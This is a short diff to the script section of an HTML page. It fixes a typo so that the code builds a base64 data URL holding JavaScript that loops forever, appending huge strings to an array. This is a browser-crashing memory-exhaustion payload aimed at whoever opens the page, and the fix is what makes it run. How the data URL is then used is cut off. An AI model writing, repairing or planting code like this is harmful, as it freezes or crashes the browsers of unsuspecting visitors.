@@ -20,7 +20,7 @@
     </main>
 </body>
 <script>
-    ar I_R = 0x1FFFFFE8;
+    var I_R = 0x1FFFFFE8;
     var I_O = 0xFFFF;
     var I_I = `f=[];while(!0){f.push(String.fromCharCode(${I_O}).repeat(${I_R}))}`;
     var I_D = `data:text/html;base64,${btoa(I_I)}`;
